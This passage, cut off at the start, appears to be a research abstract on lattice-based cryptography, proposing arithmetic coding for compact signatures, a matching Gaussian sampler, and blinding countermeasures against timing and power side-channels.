is a requirement for compression. Arithmetic Coding offers an
information theoretically optimal compression for stationary and
memoryless sources, such as the discrete Gaussian distributions often
used in Lattice-based cryptography. We show that this technique gives
better signature sizes than the previously proposed advanced
Huffman-based compressors. We further demonstrate that arithmetic
decoding from an uniform source to target distribution is also an
optimal Gaussian sampling method in the sense that a minimal amount of
true random bits is required. Performance of the new Binary Arithmetic
Coding (BAC) sampler is comparable to other mainstream samplers. The
same code, tables, or circuitry can be utilised for both tasks,
eliminating the need for separate sampling and compression components.
We also describe a simple blinding technique that can be applied to
anti-cyclic polynomial multiplication to mask timing- and power
consumption side-channels in ring arithmetic. We further show that
Gaussian sampling can also be blinded by a split-and-permute technique
while reducing the size of required CDF tables.
